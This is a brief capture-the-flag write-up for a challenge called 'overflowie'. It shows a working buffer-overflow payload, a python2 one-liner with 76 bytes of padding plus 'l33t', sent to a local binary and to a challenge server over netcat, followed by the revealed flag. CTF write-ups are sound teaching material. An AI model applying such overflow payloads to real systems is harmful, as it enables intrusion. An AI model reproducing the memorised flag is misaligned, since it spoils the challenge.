## overflowie

Flag: ctf{417e85857875cd875f23abee3d45ef6a4fa68a56e692a8c998e0d82f4f3e6ac7}

I inspected the file with objdump and I saw that I needed to do a buffer overflow.

The following payload is generated:
- 0x50 - 0x04 = 76 random bytes in order to fill the buffer;
- l33t = 0x6c333374 in order to overwrite the value of the variable which has to be equal to l33t.

```
python2 -c 'print "A" * 76 + "\x6c\x33\x33\x74\x00"' | ./overflowie
python2 -c 'print "A" * 76 + "\x6c\x33\x33\x74\x00"' | nc 34.107.86.157 32276
Enter the very secure code to get the flag: 
Omg you found the supersecret flag. You are l33t ind33d
ctf{417e85857875cd875f23abee3d45ef6a4fa68a56e692a8c998e0d82f4f3e6ac7}
```

[Back](../unbreakable.md)
